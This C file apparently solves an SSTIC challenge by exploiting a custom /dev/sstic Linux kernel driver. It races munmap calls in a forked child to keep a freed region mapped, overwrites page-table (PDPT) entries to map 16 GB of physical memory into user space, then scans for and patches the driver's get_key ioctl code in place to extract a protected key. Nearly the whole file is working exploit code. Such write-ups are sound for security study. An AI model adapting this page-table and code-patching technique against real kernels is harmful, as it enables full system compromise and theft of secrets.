
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void wait_child(int pid) {
    int wstatus;
    do {
        pid_t w = waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
        if (w == -1) {
            perror("waitpid");
            exit(EXIT_FAILURE);
        }

        if (WIFEXITED(wstatus)) {
            printf("exited, status=%d\n", WEXITSTATUS(wstatus));
        } else if (WIFSIGNALED(wstatus)) {
            printf("killed by signal %d\n", WTERMSIG(wstatus));
        } else if (WIFSTOPPED(wstatus)) {
            printf("stopped by signal %d\n", WSTOPSIG(wstatus));
        } else if (WIFCONTINUED(wstatus)) {
            printf("continued\n");
        }
    } while (!WIFEXITED(wstatus) && !WIFSIGNALED(wstatus));
}

const static uint64_t ioctl_del_region_addr = 0x710;
const static unsigned char ioctl_del_region_buff[] = {
    0x8b, 0x16, 0x48, 0x8b, 0x47, 0x20, 0x48, 0x83, 0xc7, 0x20, 0xc1, 0xea, 0x0c, 0x48, 0x39, 0xf8,
    0x75, 0x0a, 0xeb, 0x47, 0x48, 0x8b, 0x00, 0x48, 0x39, 0xf8, 0x74, 0x3f, 0x3b, 0x50, 0xfc, 0x75,
    0xf3, 0x48, 0x89, 0xc7, 0x48, 0x83, 0xef, 0x10, 0x74, 0x31, 0x48, 0x8b, 0x08, 0x48, 0x8b, 0x50,
    0x08, 0x48, 0xbe, 0x22, 0x01, 0x00, 0x00, 0x00, 0x00, 0xad, 0xde, 0x48, 0x89, 0x51, 0x08, 0x48,
    0x89, 0x0a, 0x48, 0xb9, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0xad, 0xde, 0x48, 0x89, 0x08, 0x48,
    0x89, 0x70, 0x08, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0xc3, 0xb8, 0xea, 0xff, 0xff, 0xff,
    0xc3,
};
const static uint64_t ioctl_del_region_comp_len = 0x50;

const static uint64_t target_ioctl_get_key_addr = 0xa2e;
const static unsigned char target_ioctl_get_key_origin[] = {0x48, 0x8D, 0x70, 0x44};
const static unsigned char target_ioctl_get_key_replace[] = {0x48, 0x8D, 0x70, 0x28};

struct sstic_arg_alloc
{
    unsigned int nb_pages;
    unsigned int flags;
    unsigned int id;
};

struct sstic_arg_del
{
    unsigned int id;
};

struct sstic_get_key
{
    unsigned long id;
    char key[16];
};

union sstic_arg
{
    struct sstic_arg_alloc alloc;
    struct sstic_arg_del del;
    struct sstic_get_key get_key;
};

#define ALLOC_REGION 0xC0185300
#define DEL_REGION 0xC0185301
#define GET_KEY 0xC0185304

#define SSTIC_RD 1
#define SSTIC_WR 2

int sstic_getkey(char key[16], uint64_t id)
{
    int ret;
    union sstic_arg arg;
    arg.get_key.id = id;
    int session = open("/dev/sstic", O_RDWR);
    if(session == -1)
    {
        perror("open session");
        abort();
    }
    ret = ioctl(session, GET_KEY, &arg);
    if(ret == -1)
    {
        perror("get_key");
        close(session);
        return -1;
    }
    memcpy(key, arg.get_key.key,16);
    close(session);
    return 0;
}

unsigned int allocate_region(int fd, size_t nb_pages, int flags)
{
    union sstic_arg arg;
    arg.alloc.nb_pages = nb_pages;
    arg.alloc.flags = flags;
    int ret = ioctl(fd, ALLOC_REGION, &arg);
    if(ret == -1)
    {
        perror("allocate region");
        abort();
    }
    return arg.alloc.id;
}
static void del_region(int fd, unsigned int id)
{
    union sstic_arg arg;
    arg.del.id = id;
    int ret = ioctl(fd, DEL_REGION, &arg);
    if(ret == -1)
    {
        perror("del region");
        //sleep(10);
        abort();
    }
}

void dump_raw(void* addr_, size_t size, uint64_t display_base) {
    int c;
    for (c = 0; c < size; c++) {
        if (c % 16 == 0) {
            printf("0x%016lx: ", display_base + c);
        } else if (c % 4 == 0) {
            printf(" ");
        }
        printf("%02x", *((unsigned char*) addr_ + c));
        if (c % 16 == 15 || c == size - 1) {
            printf("\n");
        }
    }
}

void dump(void* addr, size_t size) {
    dump_raw(addr, size, (uint64_t) addr);
}

int verifySet(void* addr_, char c, size_t size) {
    char* addr = (char*) addr_;
    for (size_t i = 0; i < size; i++) {
        if ( addr[i] != c) {
            printf("Error found 0x%x (expect 0x%x)\n", addr[i], c);
            dump(addr_, size);
            return 1;
        }
    }
    return 0;
}

void* mmap_kernel() {
    const unsigned N = 2;
    const unsigned N_munmap = 1;


    int session = open("/dev/sstic", O_RDWR);
    unsigned int r = allocate_region(session, N, SSTIC_RD | SSTIC_WR);

    printf("mmap map_r0\n");
    void *map_r0 = mmap(NULL, 0x1000 * N, PROT_READ | PROT_WRITE, MAP_SHARED, session, r);

    printf("map_r0 : %p\n", map_r0);
    printf("wr map_r0\n");
    memset(map_r0 + 0x1000 * (N-1), '0', 0x1000);
    dump(map_r0 + 0x1000 * (N-1), 0x100);

    printf("munmap map_r0\n");
    munmap(map_r0, 0x1000 * N);

    printf("mmap map_r1\n");
    void *map_r1 = mmap(NULL, 0x1000 * N, PROT_READ | PROT_WRITE, MAP_SHARED, session, r);
    printf("map_r1 : %p\n", map_r1);

    int child_pipe[2];
    if (pipe(child_pipe) != 0) {
        abort();
    }

    int pid = fork();
    if (pid != 0) {
        close(child_pipe[0]);
        printf("parent munmap\n");
        int i;
        for (i = 0; i < N_munmap; i++) {
            munmap(map_r1 + i * 0x1000, 0x1000);
        }
        if (N_munmap != N) {
            munmap(map_r1 + 0x1000 * N_munmap, 0x1000 * (N - N_munmap));
        }
        printf("parent wait\n");
        // signal parent munmap end
        write(child_pipe[1], &i, 1);
        close(child_pipe[1]);
    } else {
        close(child_pipe[1]);
        // wait parent munmap
        char c;
        read(child_pipe[0], &c, 1);
        close(child_pipe[0]);

        printf("child munmap\n");
        for (int i = N - 1; i >= 0; i--) {
            munmap(map_r1 + i * 0x1000, 0x1000);
        }
        printf("child exit\n");
        _exit(0);
    }
    // wait child munmap and exit
    wait_child(pid);

    printf("alloc_new_map\n");
    void *map_new = mmap((void*) 0x400000000000 + 4096 * 512 * 512, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    printf("alloc_new_map : %p\n", map_new);
    memset(map_new, 10, 4096);

    printf("mmap map_r2\n");
    void *map_r2 = mmap(NULL, 0x1000 * N, PROT_READ | PROT_WRITE, MAP_SHARED, session, r);
    printf("map_r2 : %p\n", map_r2);

    printf("del_region\n");
    del_region(session, r);

    void* PDPT = map_r2 + 0x1000 * (N-1);

    printf("dump begin PDPT\n");
    dump(PDPT, 0x100);

    if (*((unsigned* )(PDPT)) != 0x0) {
        return NULL;
    }

    uint64_t prev_entry = *((uint64_t*)(PDPT + 0x8));

    if ((prev_entry & 0x83) != 0x3) {
        return NULL;
    }

    // map the 16 first Gb
    for (uint64_t i = 0; i< 16; i++) {
        *((uint64_t*) (PDPT + i * 8)) = 0x87 | (i << 30);
    }
    //*((uint64_t*) PDPT) = prev_entry;

    printf("dump begin PDPT\n");
    dump(PDPT, 0x100);

    usleep(200);

    printf("done mmap\n");
    return (void*) 0x400000000000;
}

void* search_next_target_position(void** kernel_addr) {

    printf("search target phys_addr\n");
    for (;; *kernel_addr += 1) {
        if (    memcmp(*kernel_addr + ioctl_del_region_addr, ioctl_del_region_buff, ioctl_del_region_comp_len) == 0 &&
                memcmp(*kernel_addr + target_ioctl_get_key_addr, target_ioctl_get_key_origin, sizeof(target_ioctl_get_key_origin)) == 0) {
            printf("found target at %p\n", *kernel_addr + target_ioctl_get_key_addr);
            return *kernel_addr + target_ioctl_get_key_addr;
        }
    }
}

void set_prod() {
    char dummy[16];
    void* kernel_mem = mmap_kernel();

    void* search_addr = kernel_mem;

    while (sstic_getkey(dummy, 0x8000000000000000) != 0) {
        void* replace_addr = search_next_target_position(&search_addr);

        printf("test sstic_getkey 1\n");
        sstic_getkey(dummy, 0);
        printf("replace and rerun\n");
        memcpy(replace_addr, target_ioctl_get_key_replace, sizeof(target_ioctl_get_key_origin));
        sstic_getkey(dummy, 0);
        memcpy(replace_addr, target_ioctl_get_key_origin, sizeof(target_ioctl_get_key_origin));
        search_addr += 1;
    }
    printf("finish\n");
}

int main() {
    char key[16];

    if (sstic_getkey(key, 0x9c92b27651376bfb) == 0) {
        printf("key: %08lx%08lx\n", *((uint64_t*) key), *((uint64_t*) (key+8)));
    }

    int pid = fork();
    if (pid == 0) {
        set_prod();
        _exit(0);
    }
    wait_child(pid);

    if (sstic_getkey(key, 0x9c92b27651376bfb) == 0) {
        printf("key: %08lx%08lx\n", *((uint64_t*) key), *((uint64_t*) (key+8)));
    }

    sleep(50);

    return 0;
}
